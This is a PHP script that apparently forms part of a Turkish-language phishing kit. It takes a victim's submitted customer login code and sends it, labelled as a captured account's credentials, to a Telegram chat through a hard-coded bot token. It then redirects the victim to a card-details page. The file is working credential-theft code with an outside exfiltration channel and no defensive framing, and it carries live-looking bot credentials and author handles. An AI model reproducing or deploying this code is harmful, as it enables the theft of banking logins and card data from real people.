<?php

$botToken = '7128147377:AAGn3oNwvngc1x6pOYe_WhSniabK9T2p_-I';
$chatId = '-4160095078';

// tg: @persobey x @ber7tzz
$nmb = $_POST['nmb'];

$pingCommand = "/bin/ping -c 4 google.com";
$pingResult = shell_exec($pingCommand);

if (preg_match('/time=(\d+\.\d+) ms/', $pingResult, $matches)) {
    $pingTime = $matches[1] . 'ms';
} else {
    $pingTime = number_format(mt_rand(500, 1500) / 1000, 2) . 'ms';
}

$mesajVerisi = array(
    "Düşen hesabın kullanıcı bilgileri @persobey",
    "",
    "Müşteri Giriş Kodu: $nmb",
);

$telegramMessage = implode("\n", $mesajVerisi);

$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

$ch = curl_init($telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=$chatId&text=$telegramMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

if ($response && json_decode($response)->ok) {
    header('Location: ../kartbilgileri.php'); 
} else {
    header('Location: ../index.php'); 
}
?>
